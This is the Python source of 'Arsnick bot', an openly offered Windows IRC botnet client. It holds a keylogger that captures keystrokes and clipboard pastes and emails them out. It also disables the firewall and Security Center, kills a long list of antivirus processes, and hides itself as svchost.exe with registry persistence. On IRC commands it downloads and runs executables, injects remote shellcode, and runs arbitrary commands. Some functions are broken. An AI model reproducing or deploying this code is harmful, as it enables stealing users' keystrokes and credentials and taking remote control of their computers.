#!/usr/bin/python

# Arsnick bot
# Version 1.0.1
# by Netzwerk
#
# env :Python 2.7.5
#
# Filename : arsnick.py

# Requirements
# Use 'pip install' for missing libraries.
# Python 2.7.5
# PyHook - https://sourceforge.net/projects/pyhook/files/pyhook/1.5.1/
# 
# Compile
# Py2Exe - http://www.py2exe.org/

# Memorpy bd should be added.

#IMPORTS
import os
import random
import shutil
import socket
import sys
import string
import threading
import time
import urllib
import urllib2
import ctypes
import logging
import smtplib
from ctypes import *
import base64
from _winreg import *
import pyscreenshot
from email.mime.text import MIMEText
import win32clipboard
import pythoncom, pyHook
from pyHook import HookManager, GetKeyState, HookConstants

global logfile

temp_path = os.getenv('TEMP')
logfile = temp_path + "\\" + 'win32data.cfg'


#CONFIG
#winrgky      = 'Windows Default Service' #Windows Registry Run Key 
ircs          = 'irc.tiscali.it'          #IRC Server
ircp          = 6667                      #IRC Port
ircc          = '#yourircchannel'         #IRC Channel
ircs_backup   = 'eris.us.ircnet.net'      #Backup IRC Server
ircp_backup   = 6667                      #Backup IRC Port
ircc_backup   = '#yourircchannel2'                #Backup IRC Channel
version       = '1.0.1'                   #Arsnick Version
username      = 'sender@mail.com'         #Sender Mail
password      = 'password'            	  #Sender Mail password
emailsender   = 'ssender@mail.com'        #Sender Mail Name
#emailsmtp    = 'smtp.mail.ru'            #SMTP Server
#emailsmtport = '465'                     #SMTP Port
emailreceiver = 'receiver@mail.com'       #Destination Mail

#GLOBALS
irc = socket.socket(socket.AF_INET,socket.SOCK_STREAM)


class keylogger(threading.Thread):
    def __init__(self):
            threading.Thread.__init__(self)

    def run(self):

        def OnKeyboardEvent(event):
        # ctrl v

            if GetKeyState(HookConstants.VKeyToID('VK_CONTROL')) and HookConstants.IDToName(event.KeyID) == 'V':
                win32clipboard.OpenClipboard()
                pasted_value = " [***CTRL+V***] " + win32clipboard.GetClipboardData() + " [END CTRL+V] "
                win32clipboard.CloseClipboard()
            else :
                pasted_value = ''

                FORMAT = '%(asctime)-15s %(message)s'
                logging.basicConfig(filename= logfile,
                                    level=logging.DEBUG, 
                                    format=FORMAT,
                                    filemode='a')
                logging.log(10,str(event.WindowName) + " " + str(event.Key) + pasted_value)

                provatesto = str(event.Key)
                # print provatesto
                return True        

        # create a hook manager
        hm = pyHook.HookManager()
        # watch for all mouse events
        hm.KeyDown = OnKeyboardEvent
        # set the hook
        hm.HookKeyboard()
        # wait forever
        pythoncom.PumpMessages()

class mailsender(threading.Thread):
    def __init__(self):
            threading.Thread.__init__(self)

    def run(self):
    
    
        # Parse the shitty PyHook/Pythoncom log 
        while 1:
            time.sleep(20)
    
            # Mail message containing keylogs
            fo = open(logfile, "r")
            #for line in fo:
            msg = MIMEText(fo.read())
            fo.close()        
    
            timestr = time.strftime("%Y%m%d%H%M%S") # create a timestring of unix timestamp
    
            msg['Subject'] = 'Keylogs' + ' ' + timestr 
            msg['From'] = emailsender
            msg['To'] = emailreceiver
    
            try:
                s = smtplib.SMTP_SSL('smtp.mail.ru:465')
                s.login(username, password)
                s.sendmail(emailsender, [emailreceiver], msg.as_string())
                s.close()
                # irc_msg('Successfully sent email')
    
            except Exception, a:
                pass
                # irc_msg(a)
                
#ANTIVIRUS / FIREWALL KILLER
class antikiller(threading.Thread):
    def __init__(self):
            threading.Thread.__init__(self)
            def run(self):
                # Stop the Security Center on Win Vista/7
                os.popen("net stop \"Security Center\"")
                # Firewall killer On WinXP
                os.popen("REG add \"HKLM\SYSTEM\CurrentControlSet\services\MpsSvc\" /v Start /t REG_DWORD /d 4 /f")
                os.popen("net stop MpsSvc")
                # Firewall killer On Win 7
                os.popen("netsh advfirewall set profiles state off")
                # AV name detection
                avs=['AAWTray.exe', 'Ad-Aware.exe', 'MSASCui.exe','cmd.exe', 'cmd32.exe', '_avp32.exe', '_avpcc.exe', '_avpm.exe', 'aAvgApi.exe', 'ackwin32.exe', 'adaware.exe', 'advxdwin.exe', 'agentsvr.exe', 'agentw.exe', 'alertsvc.exe', 'alevir.exe', 'alogserv.exe', 'amon9x.exe', 'anti-trojan.exe', 'antivirus.exe', 'ants.exe', 'apimonitor.exe', 'aplica32.exe', 'apvxdwin.exe', 'arr.exe', 'atcon.exe', 'atguard.exe', 'atro55en.exe', 'atupdater.exe', 'atwatch.exe', 'au.exe', 'aupdate.exe', 'auto-protect.nav80try.exe', 'autodown.exe', 'autotrace.exe', 'autoupdate.exe', 'avconsol.exe', 'ave32.exe', 'avgcc32.exe', 'avgctrl.exe', 'avgemc.exe', 'avgnt.exe', 'avgrsx.exe', 'avgserv.exe', 'avgserv9.exe', 'avguard.exe', 'avgw.exe', 'avkpop.exe', 'avkserv.exe', 'avkservice.exe', 'avkwctl9.exe', 'avltmain.exe', 'avnt.exe', 'avp.exe', 'avp.exe', 'avp32.exe', 'avpcc.exe', 'avpdos32.exe', 'avpm.exe', 'avptc32.exe', 'avpupd.exe', 'avsched32.exe', 'avsynmgr.exe', 'avwin.exe', 'avwin95.exe', 'avwinnt.exe', 'avwupd.exe', 'avwupd32.exe', 'avwupsrv.exe', 'avxmonitor9x.exe', 'avxmonitornt.exe', 'avxquar.exe', 'backweb.exe', 'bargains.exe', 'bd_professional.exe', 'beagle.exe', 'belt.exe', 'bidef.exe', 'bidserver.exe', 'bipcp.exe', 'bipcpevalsetup.exe', 'bisp.exe', 'blackd.exe', 'blackice.exe', 'blink.exe', 'blss.exe', 'bootconf.exe', 'bootwarn.exe', 'borg2.exe', 'bpc.exe', 'brasil.exe', 'bs120.exe', 'bundle.exe', 'bvt.exe', 'ccapp.exe', 'ccevtmgr.exe', 'ccpxysvc.exe', 'cdp.exe', 'cfd.exe', 'cfgwiz.exe', 'cfiadmin.exe', 'cfiaudit.exe', 'cfinet.exe', 'cfinet32.exe', 'claw95.exe', 'claw95cf.exe', 'clean.exe', 'cleaner.exe', 'cleaner3.exe', 'cleanpc.exe', 'click.exe', 'cmesys.exe', 'cmgrdian.exe', 'cmon016.exe', 'connectionmonitor.exe', 'cpd.exe', 'cpf9x206.exe', 'cpfnt206.exe', 'ctrl.exe', 'cv.exe', 'cwnb181.exe', 'cwntdwmo.exe', 'datemanager.exe', 'dcomx.exe', 'defalert.exe', 'defscangui.exe', 'defwatch.exe', 'deputy.exe', 'divx.exe', 'dllcache.exe', 'dllreg.exe', 'doors.exe', 'dpf.exe', 'dpfsetup.exe', 'dpps2.exe', 'drwatson.exe', 'drweb32.exe', 'drwebupw.exe', 'dssagent.exe', 'dvp95.exe', 'dvp95_0.exe', 'ecengine.exe', 'efpeadm.exe', 'emsw.exe', 'ent.exe', 'esafe.exe', 'escanhnt.exe', 'escanv95.exe', 'espwatch.exe', 'ethereal.exe', 'etrustcipe.exe', 'evpn.exe', 'exantivirus-cnet.exe', 'exe.avxw.exe', 'expert.exe', 'explore.exe', 'f-agnt95.exe', 'f-prot.exe', 'f-prot95.exe', 'f-stopw.exe', 'fameh32.exe', 'fast.exe', 'fch32.exe', 'fih32.exe', 'findviru.exe', 'firewall.exe', 'fnrb32.exe', 'fp-win.exe', 'fp-win_trial.exe', 'fprot.exe', 'frw.exe', 'fsaa.exe', 'fsav.exe', 'fsav32.exe', 'fsav530stbyb.exe', 'fsav530wtbyb.exe', 'fsav95.exe', 'fsgk32.exe', 'fsm32.exe', 'fsma32.exe', 'fsmb32.exe', 'gator.exe', 'gbmenu.exe', 'gbpoll.exe', 'generics.exe', 'gmt.exe', 'guard.exe', 'guarddog.exe', 'hacktracersetup.exe', 'hbinst.exe', 'hbsrv.exe', 'hotactio.exe', 'hotpatch.exe', 'htlog.exe', 'htpatch.exe', 'hwpe.exe', 'hxdl.exe', 'hxiul.exe', 'iamapp.exe', 'iamserv.exe', 'iamstats.exe', 'ibmasn.exe', 'ibmavsp.exe', 'icload95.exe', 'icloadnt.exe', 'icmon.exe', 'icsupp95.exe', 'icsuppnt.exe', 'idle.exe', 'iedll.exe', 'iedriver.exe', 'iexplorer.exe', 'iface.exe', 'ifw2000.exe', 'inetlnfo.exe', 'infus.exe', 'infwin.exe', 'init.exe', 'intdel.exe', 'intren.exe', 'iomon98.exe', 'istsvc.exe', 'jammer.exe', 'jdbgmrg.exe', 'jedi.exe', 'kavlite40eng.exe', 'kavpers40eng.exe', 'kavpf.exe', 'kazza.exe', 'keenvalue.exe', 'kerio-pf-213-en-win.exe', 'kerio-wrl-421-en-win.exe', 'kerio-wrp-421-en-win.exe', 'kernel32.exe', 'killprocesssetup161.exe', 'launcher.exe', 'ldnetmon.exe', 'ldpro.exe', 'ldpromenu.exe', 'ldscan.exe', 'lnetinfo.exe', 'loader.exe', 'localnet.exe', 'lockdown.exe', 'lockdown2000.exe', 'lookout.exe', 'lordpe.exe', 'lsetup.exe', 'luall.exe', 'luau.exe', 'lucomserver.exe', 'luinit.exe', 'luspt.exe', 'mapisvc32.exe', 'mcagent.exe', 'mcmnhdlr.exe', 'mcshield.exe', 'mctool.exe', 'mcupdate.exe', 'mcvsrte.exe', 'mcvsshld.exe', 'md.exe', 'mfin32.exe', 'mfw2en.exe', 'mfweng3.02d30.exe', 'mgavrtcl.exe', 'mgavrte.exe', 'mghtml.exe', 'mgui.exe', 'minilog.exe', 'mmod.exe', 'monitor.exe', 'moolive.exe', 'mostat.exe', 'mpfagent.exe', 'mpfservice.exe', 'mpftray.exe', 'mrflux.exe', 'msapp.exe', 'msbb.exe', 'msblast.exe', 'mscache.exe', 'msccn32.exe', 'mscman.exe', 'msconfig.exe', 'msdm.exe', 'msdos.exe', 'msiexec16.exe', 'msinfo32.exe', 'mslaugh.exe', 'msmgt.exe', 'msmsgri32.exe', 'mssmmc32.exe', 'mssys.exe', 'msvxd.exe', 'mu0311ad.exe', 'mwatch.exe', 'n32scanw.exe', 'nav.exe', 'navap.navapsvc.exe', 'navapsvc.exe', 'navapw32.exe', 'navdx.exe', 'navlu32.exe', 'navnt.exe', 'navstub.exe', 'navw32.exe', 'navwnt.exe', 'nc2000.exe', 'ncinst4.exe', 'ndd32.exe', 'neomonitor.exe', 'neowatchlog.exe', 'netarmor.exe', 'netd32.exe', 'netinfo.exe', 'netmon.exe', 'netscanpro.exe', 'netspyhunter-1.2.exe', 'netstat.exe', 'netutils.exe', 'nisserv.exe', 'nisum.exe', 'nmain.exe', 'nod32.exe', 'normist.exe', 'norton_internet_secu_3.0_407.exe', 'notstart.exe', 'npf40_tw_98_nt_me_2k.exe', 'npfmessenger.exe', 'nprotect.exe', 'npscheck.exe', 'npssvc.exe', 'nsched32.exe', 'nssys32.exe', 'nstask32.exe', 'nsupdate.exe', 'nt.exe', 'ntrtscan.exe', 'ntvdm.exe', 'ntxconfig.exe', 'nui.exe', 'nupgrade.exe', 'nvarch16.exe', 'nvc95.exe', 'nvsvc32.exe', 'nwinst4.exe', 'nwservice.exe', 'nwtool16.exe', 'ollydbg.exe', 'onsrvr.exe', 'optimize.exe', 'ostronet.exe', 'otfix.exe', 'outpost.exe', 'outpostinstall.exe', 'outpostproinstall.exe', 'padmin.exe', 'panixk.exe', 'patch.exe', 'pavcl.exe', 'pavproxy.exe', 'pavsched.exe', 'pavw.exe', 'pccwin98.exe', 'pcfwallicon.exe', 'pcip10117_0.exe', 'pcscan.exe', 'pdsetup.exe', 'periscope.exe', 'persfw.exe', 'perswf.exe', 'pf2.exe', 'pfwadmin.exe', 'pgmonitr.exe', 'pingscan.exe', 'platin.exe', 'pop3trap.exe', 'poproxy.exe', 'popscan.exe', 'portdetective.exe', 'portmonitor.exe', 'powerscan.exe', 'ppinupdt.exe', 'pptbc.exe', 'ppvstop.exe', 'prizesurfer.exe', 'prmt.exe', 'prmvr.exe', 'procdump.exe', 'processmonitor.exe', 'procexplorerv1.0.exe', 'programauditor.exe', 'proport.exe', 'protectx.exe', 'pspf.exe', 'purge.exe', 'qconsole.exe', 'qserver.exe', 'rapapp.exe', 'rav7.exe', 'rav7win.exe', 'rav8win32eng.exe', 'ray.exe', 'rb32.exe', 'rcsync.exe', 'realmon.exe', 'reged.exe', 'regedit.exe', 'regedt32.exe', 'rescue.exe', 'rescue32.exe', 'rrguard.exe', 'rshell.exe', 'rtvscan.exe', 'rtvscn95.exe', 'rulaunch.exe', 'run32dll.exe', 'rundll.exe', 'rundll16.exe', 'ruxdll32.exe', 'safeweb.exe', 'sahagent.exe', 'save.exe', 'savenow.exe', 'sbserv.exe', 'sc.exe', 'scam32.exe', 'scan32.exe', 'scan95.exe', 'scanpm.exe', 'scrscan.exe', 'serv95.exe', 'setup_flowprotector_us.exe', 'setupvameeval.exe', 'sfc.exe', 'sgssfw32.exe', 'sh.exe', 'shellspyinstall.exe', 'shn.exe', 'showbehind.exe', 'smc.exe', 'sms.exe', 'smss32.exe', 'soap.exe', 'sofi.exe', 'sperm.exe', 'spf.exe', 'sphinx.exe', 'spoler.exe', 'spoolcv.exe', 'spoolsv32.exe', 'spyxx.exe', 'srexe.exe', 'srng.exe', 'ss3edit.exe', 'ssg_4104.exe', 'ssgrate.exe', 'st2.exe', 'start.exe', 'stcloader.exe', 'supftrl.exe', 'support.exe', 'supporter5.exe', 'svc.exe', 'svchostc.exe', 'svchosts.exe', 'svshost.exe', 'sweep95.exe', 'sweepnet.sweepsrv.sys.swnetsup.exe', 'symproxysvc.exe', 'symtray.exe', 'sysedit.exe', 'system.exe', 'system32.exe', 'sysupd.exe', 'taskmg.exe', 'taskmgr.exe', 'taskmo.exe', 'taskmon.exe', 'taumon.exe', 'tbscan.exe', 'tc.exe', 'tca.exe', 'tcm.exe', 'tds-3.exe', 'tds2-98.exe', 'tds2-nt.exe', 'teekids.exe', 'tfak.exe', 'tfak5.exe', 'tgbob.exe', 'titanin.exe', 'titaninxp.exe', 'tracert.exe', 'trickler.exe', 'trjscan.exe', 'trjsetup.exe', 'trojantrap3.exe', 'tsadbot.exe', 'tvmd.exe', 'tvtmd.exe', 'undoboot.exe', 'updat.exe', 'update.exe', 'upgrad.exe', 'utpost.exe', 'vbcmserv.exe', 'vbcons.exe', 'vbust.exe', 'vbwin9x.exe', 'vbwinntw.exe', 'vcsetup.exe', 'vet32.exe', 'vet95.exe', 'vettray.exe', 'vfsetup.exe', 'vir-help.exe', 'virusmdpersonalfirewall.exe', 'vnlan300.exe', 'vnpc3000.exe', 'vpc32.exe', 'vpc42.exe', 'vpfw30s.exe', 'vptray.exe', 'vscan40.exe', 'vscenu6.02d30.exe', 'vsched.exe', 'vsecomr.exe', 'vshwin32.exe', 'vsisetup.exe', 'vsmain.exe', 'vsmon.exe', 'vsstat.exe', 'vswin9xe.exe', 'vswinntse.exe', 'vswinperse.exe', 'w32dsm89.exe', 'w9x.exe', 'watchdog.exe', 'webdav.exe', 'webscanx.exe', 'webtrap.exe', 'wfindv32.exe', 'whoswatchingme.exe', 'wimmun32.exe', 'win-bugsfix.exe', 'win32.exe', 'win32us.exe', 'winactive.exe', 'window.exe', 'windows.exe', 'wininetd.exe', 'wininitx.exe', 'winlogin.exe', 'winmain.exe', 'winnet.exe', 'winppr32.exe', 'winrecon.exe', 'winservn.exe', 'winssk32.exe', 'winstart.exe', 'winstart001.exe', 'wintsk32.exe', 'winupdate.exe', 'wkufind.exe', 'wnad.exe', 'wnt.exe', 'wradmin.exe', 'wrctrl.exe', 'wsbgate.exe', 'wupdater.exe', 'wupdt.exe', 'wyvernworksfirewall.exe', 'xpf202en.exe', 'zapro.exe', 'zapsetup3001.exe', 'zatutor.exe', 'zonalm2601.exe', 'zonealarm.exe']
                #
                processes=os.popen('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="').read()
                ps=[]
                for i in processes.split(" "):
                    if ".exe" in i:
                        ps.append(i.replace("K\n","").replace("\n",""))
                for av in avs:
                    for p in ps:
                        if p==av:
                            os.popen("TASKKILL /F /IM \"{}\"".format(p))                

    
#EXECUTE COMMAND
def command(cmd): os.popen(cmd)


#DOWNLOAD / EXECUTE
class download(threading.Thread):
    def __init__(self, url):
        self.url = url
        threading.Thread.__init__(self)
    def run(self):
        try:
            if getType(self.url) == 'application/octet-stream':
                    name = os.path.basename(self.url)
                    temp = os.environ['TEMP']
                    path = temp + '\\' + name
                    urllib.urlretrieve(self.url, path)
                    command(path)
                    irc_msg('Download done')
            else:
                pass
        except:
            irc_msg('Download failed')

#SHELLCODE DOWNLOADER / EXECUTER
class downloadshellcode(threading.Thread):
    def __init__(self, url):
        self.url = url
        threading.Thread.__init__(self)
    def run(self):
        try:
            if getType(self.url) == 'application/octet-stream':
                    name = os.path.basename(self.url)
                    temp = os.environ['TEMP']
                    path = temp + '\\' + name
                    response = urllib2.urlopen(self.url)
                    shellcode = base64.b64decode(response.read())
                    shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))
                    shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))
                    shellcode_func()
                    irc_msg('Shellcode executed.')
            else:
                pass
        except:
            irc_msg('Download failed')

#COUNTRY
def getCountry():
    if getIP() == 'Unknown IP':
        return 'Unknown Country'
    else:
        try:
            return urllib.urlopen('http://api.wipmania.com/' + getIP()).read()
        except:
            return 'Unknown Country'

#IP ADDRESS
def getIP():
    try:
        return urllib.urlopen('http://bot.whatismyipaddress.com/').read()
    except:
        return 'Unknown IP'

#RANDOM KEY
def getKey(length): return str(random.randint(1000, 9999))

#OPERATING SYSTEM
def getOS():
    try:
        version = os.sys.getwindowsversion()
        key     = version[3], version[0], version[1]
        windows = {
            (1, 4, 0): 'Windows 95',
            (1, 4, 10): 'Windows 98',
            (1, 4, 90): 'Windows ME',
            (2, 4, 0): 'Windows NT',
            (2, 5, 0): 'Windows 2000',
            (2, 5, 1): 'Windows XP',
            (2, 5, 2): 'Windows 2003',
            (2, 6, 0): 'Windows Vista',
            (2, 6, 1): 'Windows 7',
            (2, 6, 2): 'Windows 8',
            (2, 6, 3): 'Windows 8.1',
            (2, 10, 0): 'Windows 10'
        }
        if windows.has_key(key):
            return windows[key]
        else:
            return 'Unknown OS'
    except:
        return 'Unknown OS'

#GET FILE TYPE
def getType(url):
    try:
        return urllib.urlopen(url).info()['Content-Type']
    except:
        return 'Unknown Type'

def screenshot():
    # ImageGrab.grab().show
    ImageGrab.grab().save(temp_path + "\\" + 'scr-' + time.strftime('%Y_%m_%d%_%H_%M_%S') + '.png', 'PNG')
    screenshotloc = ImageGrab.grab_to_file

#CONNECT
def irc_connect(server, port, channel, nick):
    irc.connect((server, port))
    time.sleep(3)
    irc_raw('NICK ' + nick)
    time.sleep(3)
    irc_raw('USER ' + nick + ' ' + getKey(4) +  ' ' + server + ' :' + getKey(4))
    time.sleep(3)
    irc_raw('JOIN ' + channel)

#MESSAGE
def irc_msg(msg): irc_raw('PRIVMSG ' + ircc + ' : ' + msg)

#RAW
def irc_raw(msg): irc.send(msg + '\r\n')

#MELT FILE
def melt():
    try:
        dirAppData = os.getenv('APPDATA')
        dirTemp    = os.getenv('TEMP')
        fileName   = dirAppData + '\\svchost.exe'
        selfName   = os.path.basename(sys.argv[0])
        if sys.argv[0] == fileName:
            startup().start()
        else:
            shutil.copy(sys.argv[0], fileName)
            command('attrib +h +s +r ' + fileName)
            command(fileName)
            sys.exit()
    except:
        sys.exit()

#PERSISTENT REGISTRY STARTUP
class startup(threading.Thread):
    def __init__(self):
            threading.Thread.__init__(self)
    def run(self):
        reg = ConnectRegistry(None, HKEY_CURRENT_USER)
        key = OpenKey(reg, r'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, KEY_ALL_ACCESS)
        while True:
            try:
                try:
                    QueryValueEx(key, 'Windows Default Services')
                except:
                    SetValueEx(key, 'Windows Default Services', 0, REG_SZ, sys.argv[0])
                    time.sleep(3)
            except:
                time.sleep(3)

#UNINSTALL
def uninstall():
    try:
        dirTemp   = os.getenv('TEMP')
        batchFile = open(dirTemp + '\\uninstall.bat', 'w')
        batchFile.write('@echo off\n')
        batchFile.write('ping 127.0.0.1 -n 6\n')
        batchFile.write('del /F /Q ' + sys.argv[0] + '\n')
        batchFile.write('del %0\n')
        batchFile.write('exit')
        batchFile.close()
        try:
            reg = ConnectRegistry(None, HKEY_CURRENT_USER)
            key = OpenKey(reg, r'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, KEY_ALL_ACCESS)
            DeleteValue(key, 'Windows Default Services') 
        except:
            pass
        os.system(dirTemp + '\\uninstall.bat')
        sys.exit()
    except:
        sys.exit()

#ANTIVIRUS KILLER
antikiller().start()
#WINDOWS ADMIN PRIV EXCALATION EXPLOIT (?)
#SETUP
connected = False
key       = getKey(4)
nick      = 'arsnk-' + key
infect    = False

#KEYLOGGER & MAILSENDER THREAD START        
keylogger().start()
mailsender().start()
#INFECTION
if infect == True:
    melt()
    sys.exit()
elif infect == False:
    pass
        
        
#IRC CONNECT
while connected == False:
    try:
        try:
            irc_connect(ircs, ircp, ircc, nick)
            connected = True
        except:
            irc_connect(ircs_backup, ircp_backup, ircc_backup, nick)
            ircc = ircc_backup
            connected = True
    except:
        time.sleep(300) #5 MINUTE DELAY


#COMMANDS
while connected == True:
    try:
        data = irc.recv(4096)
        data = data.strip('\n\r')
        split = data.split()

        if data.find('PING') != -1:
            irc_raw('PONG ' + split[1])

        if data.find ('PRIVMSG') != -1:
            nick = data.split('!')[0].replace(':', '', 1)
            host = data.split('@')[1].split(' ')[0]
            msg  = ''.join(data.split(':', 2)[2:]).replace('\r\n', '')

            if msg.startswith('.dl '):
                if msg.startswith('.dl all '):
                    url = msg.replace('.dl all ', '', 1)
                    download(url).start()
                elif msg.startswith('.dl ' + key + ' '):
                    url = msg.replace('.dl ' + key + ' ', '', 1)
                    download(url).start()

            elif msg == '.info':
                username = os.environ.get('USERNAME')
                hostname = os.environ.get('COMPUTERNAME')
                irc_msg('[INFO] - Version ' + version + ' - ' + username.lower() + '@' + hostname.lower() + ' - ' + getOS() + ' - ' + getIP() + ' - ' + getCountry())

            elif msg == '.screenshot':
                screenshot()
                irc_msg('Screenshot saved to ' + screenshot.screenshotloc)

            elif msg.startswith('.shellcode '):
                if msg.startswith('.shellcode all '):
                    url = msg.replace('.shellcode all ', '', 1)
                    downloadshellcode(url).start()
                elif msg.startswith('.shellcode ' + key + ' '):
                    url = msg.replace('.shellcode ' + key + ' ', '', 1)
                    downloadshellcode(url).start()   

            elif msg.startswith('.run ' + key + ' '):
                    runcmd = msg.replace('.run ' + key + ' ', '', 1)
                    command(runcmd)

            elif msg == '.kill ' + key:
                        uninstall()

            elif msg == '.nuke':
                    uninstall()
    except:
        pass




